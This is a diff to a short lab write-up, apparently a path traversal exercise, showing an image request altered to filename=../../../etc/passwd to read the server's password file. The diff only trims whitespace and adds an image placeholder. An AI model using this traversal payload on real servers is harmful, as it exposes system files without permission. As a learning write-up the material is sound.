@@ -3,7 +3,10 @@
 ## My Solve
 
 * GET request for an image looks like this : `GET /image?filename=24.jpg HTTP/2`
-* I modified filename to look like: `GET /image?filename=../../../etc/passwd HTTP/2`, this gives us the contents of the `etc/passwd` file. 
+* I modified filename to look like: `GET /image?filename=../../../etc/passwd HTTP/2`, this gives us the contents of the `etc/passwd` file.
+
+  ![Uploading image.png…]()
+
 
 This works because -
 
